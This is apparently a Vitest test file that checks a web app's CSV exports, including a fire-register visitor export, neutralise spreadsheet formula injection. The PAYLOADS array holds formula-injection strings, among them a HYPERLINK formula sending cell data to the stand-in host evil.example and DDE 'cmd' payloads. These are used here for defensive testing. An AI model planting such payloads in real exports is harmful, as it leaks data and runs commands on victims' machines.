import { describe, it, expect } from "vitest";
import { readFileSync, readdirSync, statSync } from "node:fs";
import { join, resolve } from "node:path";
import { csvEscape } from "@/lib/csv";
import { musterToCsv } from "@/lib/site-compliance/export";
import type { MusterRoll } from "@/lib/site-compliance/muster";

/**
 * INJ-05 — CSV / spreadsheet formula injection.
 *
 * lib/csv.ts → csvEscape is the ONE authoritative CSV field serialiser: it
 * quotes per RFC 4180 AND neutralises a leading `= + - @ TAB CR` (the OWASP
 * formula-injection triggers) with an apostrophe, except for plain numbers.
 *
 * The defect: the fire-register muster export (lib/site-compliance/export.ts)
 * carried its OWN field escaper that quoted but did not neutralise — and its
 * cells are free text ANY org member can enter (a visitor's name and company at
 * sign-in). So a staff member could sign in a "visitor" called
 * `=HYPERLINK("http://evil.example/?"&A1,"Open")` and have it evaluate when an
 * admin opened the exported register.
 */

const PAYLOADS = [
  `=HYPERLINK("http://evil.example/?x="&A1,"Click")`,
  `=cmd|' /C calc'!A0`,
  `+SUM(1,2)`,
  `-2+3+cmd|' /C calc'!A0`,
  `@SUM(A1:A9)`,
  `\t=1+1`,
  `\r=1+1`,
];

function rollWith(name: string, company: string): MusterRoll {
  return {
    generatedAt: "2026-11-13T09:00:00.000Z",
    workers: [],
    visitors: [{ name, company, signedInAt: "2026-11-13T08:00:00.000Z" }],
  } as unknown as MusterRoll;
}

/** First character of each data cell of a one-row CSV, RFC-4180 unquoted. */
function firstDataRowCells(csv: string): string[] {
  const row = csv.split("\r\n")[1] ?? "";
  const cells: string[] = [];
  let cur = "";
  let quoted = false;
  for (let i = 0; i < row.length; i++) {
    const ch = row[i]!;
    if (quoted) {
      if (ch === '"' && row[i + 1] === '"') { cur += '"'; i++; }
      else if (ch === '"') quoted = false;
      else cur += ch;
    } else if (ch === '"') quoted = true;
    else if (ch === ",") { cells.push(cur); cur = ""; }
    else cur += ch;
  }
  cells.push(cur);
  return cells;
}

describe("csvEscape neutralises every formula trigger", () => {
  it("prefixes an apostrophe so the cell is text, not a formula", () => {
    for (const p of PAYLOADS) {
      const out = csvEscape(p);
      const unquoted = out.startsWith('"') ? out.slice(1) : out;
      expect(unquoted.startsWith("'"), JSON.stringify(p)).toBe(true);
    }
  });

  it("leaves real numbers numeric (financial exports must still sum)", () => {
    expect(csvEscape(-100.5)).toBe("-100.5");
    expect(csvEscape("-100.00")).toBe("-100.00");
    expect(csvEscape("42")).toBe("42");
  });

  it("does not mangle ordinary text that merely CONTAINS a trigger", () => {
    expect(csvEscape("Smith & Sons - Roofing")).toBe("Smith & Sons - Roofing");
    expect(csvEscape("a=b")).toBe("a=b");
  });
});

describe("muster (fire register) CSV — visitor free text cannot become a formula", () => {
  it("a hostile visitor name / company is neutralised in the export", () => {
    for (const p of PAYLOADS) {
      const csv = musterToCsv(rollWith(p, p), { siteName: "Yard", generatedAt: "2026-11-13T09:00:00.000Z" });
      const [name, , company] = firstDataRowCells(csv);
      expect(/^[=+\-@\t\r]/.test(name ?? ""), `name cell: ${JSON.stringify(name)}`).toBe(false);
      expect(/^[=+\-@\t\r]/.test(company ?? ""), `company cell: ${JSON.stringify(company)}`).toBe(false);
      // The original text is preserved after the neutralising apostrophe.
      expect(name).toBe(`'${p}`);
    }
  });

  it("an ordinary register row is byte-for-byte unchanged", () => {
    const csv = musterToCsv(rollWith("Dave O'Neill", "Acme, Ltd"), {
      siteName: "Yard",
      generatedAt: "2026-11-13T09:00:00.000Z",
    });
    expect(csv.split("\r\n")[1]).toBe(`Dave O'Neill,Visitor,"Acme, Ltd",08:00`);
  });
});

describe("every CSV producer serialises through lib/csv (no private escapers)", () => {
  const ROOT = resolve(__dirname, "..", "..");
  const files: string[] = [];
  const walk = (dir: string) => {
    for (const name of readdirSync(dir)) {
      if (name === "node_modules" || name.startsWith(".")) continue;
      const p = join(dir, name);
      if (statSync(p).isDirectory()) walk(p);
      else if (/\.tsx?$/.test(name)) files.push(p);
    }
  };
  for (const d of ["app", "lib", "server", "components"]) walk(join(ROOT, d));

  it("no module defines its own CSV field escaper", () => {
    const offenders: string[] = [];
    for (const f of files) {
      const rel = f.replace(ROOT + "/", "");
      if (rel === "lib/csv.ts") continue;
      const src = readFileSync(f, "utf8");
      // The signature of a hand-rolled RFC-4180 quoter: doubling `"` → `""`.
      if (/\.replace\(\s*\/"\/g\s*,\s*(['"`])""\1\s*\)/.test(src)) offenders.push(rel);
    }
    expect(offenders, offenders.join("\n")).toEqual([]);
  });
});
